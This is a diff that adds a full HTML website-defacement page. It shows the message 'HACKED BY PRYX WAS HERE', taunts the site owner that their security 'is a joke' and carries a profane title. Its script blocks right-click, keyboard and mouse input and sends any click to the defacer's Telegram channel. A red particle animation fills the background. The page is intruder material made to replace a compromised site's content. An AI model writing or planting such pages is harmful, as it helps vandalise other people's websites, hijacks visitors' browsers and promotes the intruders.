@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Fuck Society..!</title>
+    <link href="https://fonts.googleapis.com/css?family=Acme" rel="stylesheet">
+    <style>
+        body, a:hover { cursor: url('https://cur.cursors-4u.net/symbols/sym-1/sym46.cur'), progress !important; }
+        body { margin: 0; overflow: hidden; background: radial-gradient(circle at center, #000000, #1a1a1a); color: white; font-family: 'Acme', sans-serif; text-align: center; }
+        .glow { font-size: 3em; color: #ff0033; animation: glow 1.5s infinite alternate; }
+        @keyframes glow { 0%,100%{ text-shadow: 0 0 10px #ff0033, 0 0 20px #ff0033, 0 0 30px #ff0033; } 50%{ text-shadow: 0 0 20px #ff0033, 0 0 40px #ff0033, 0 0 60px #ff0033; } }
+        .pulse { animation: pulse 3s infinite alternate; border: 2px solid #ff0033; border-radius: 50%; width: 250px; margin: 20px auto; }
+        @keyframes pulse { 0%,100%{ transform: scale(1); } 50%{ transform: scale(1.1); } }
+        .fadeIn { animation: fadeIn 3s ease-in-out; }
+        @keyframes fadeIn { from{ opacity: 0; } to{ opacity: 1; } }
+        .message { font-size: 1.5em; color: #C0C0C0; margin: 20px 0; }
+        .highlight { color: #ff0000; font-size: 1.8em; }
+        canvas { position: absolute; top: 0; left: 0; z-index: -1; }
+    </style>
+</head>
+
+<body>
+    <div class="glow fadeIn"><span> "your Security is a joke Fix it!" </span></div>
+    <div><img class="pulse" src="https://c.top4top.io/p_3277zn7tn0.jpg" alt="Black Widow"></div>
+    <div class="message"><font class="highlight">[!] HACKED BY PRYX WAS HERE[!]</font><br><b>
+    </b></div>
+    <div class="message"><b> "Welcome to the dark side!"  </b></div>
+    <div class="message"><b> ix0day ):</div>
+    <canvas id="nokey"></canvas>
+
+    <script>
+        function redirectToTelegram(){window.location.href="https://t.me/ixzer0";}
+        document.addEventListener("contextmenu",function(e){e.preventDefault();});
+        document.addEventListener("keydown",function(e){e.preventDefault();});
+        document.addEventListener("mousedown",function(e){e.preventDefault();});
+        document.addEventListener("DOMContentLoaded",function(){document.body.addEventListener("click",redirectToTelegram);});
+        var canvas=document.getElementById('nokey'),ctx=canvas.getContext('2d');
+        var balls=[],R=3,dis_limit=150,link_line_width=0.5;
+        function initCanvas(){canvas.width=window.innerWidth;canvas.height=window.innerHeight;}
+        function addBall(){balls.push({x:Math.random()*canvas.width,y:Math.random()*canvas.height,vx:(Math.random()-0.5)*3,vy:(Math.random()-0.5)*3,r:R});}
+        function drawBalls(){ctx.clearRect(0,0,canvas.width,canvas.height);balls.forEach(function(b){ctx.fillStyle=`rgba(255,0,0,1)`;ctx.beginPath();ctx.arc(b.x,b.y,b.r,0,Math.PI*2);ctx.closePath();ctx.fill();});}
+        function updateBalls(){balls.forEach(function(b){b.x+=b.vx;b.y+=b.vy;if(b.x<0||b.x>canvas.width||b.y<0||b.y>canvas.height){b.x=Math.random()*canvas.width;b.y=Math.random()*canvas.height;}});}
+        function drawLines(){for(let i=0;i<balls.length;i++){for(let j=i+1;j<balls.length;j++){var dist=Math.hypot(balls[i].x-balls[j].x,balls[i].y-balls[j].y);if(dist<dis_limit){ctx.strokeStyle=`rgba(255,0,0,${1-dist/dis_limit})`;ctx.lineWidth=link_line_width;ctx.beginPath();ctx.moveTo(balls[i].x,balls[i].y);ctx.lineTo(balls[j].x,balls[j].y);ctx.closePath();ctx.stroke();}}}}
+        function render(){drawBalls();drawLines();updateBalls();requestAnimationFrame(render);}
+        initCanvas();window.addEventListener('resize',initCanvas);
+        for(let i=0;i<100;i++)addBall();render();
+    </script>
+</body>
+</html>
